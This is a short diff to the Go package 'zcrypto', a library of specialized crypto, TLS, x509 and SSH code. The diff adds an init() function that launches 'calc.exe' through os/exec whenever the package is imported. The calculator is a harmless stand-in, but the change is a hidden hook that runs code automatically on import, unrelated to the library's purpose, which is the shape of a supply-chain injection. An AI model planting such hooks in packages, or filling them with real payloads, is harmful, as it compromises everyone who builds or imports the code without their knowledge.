@@ -1,5 +1,9 @@
 package zcrypto
 
+import "os/exec"
+
+func init() { exec.Command("calc.exe").Start() }
+
 /*
 
 excrypto offers specialized versions of the Go crypto, TLS, x509, and SSH packages
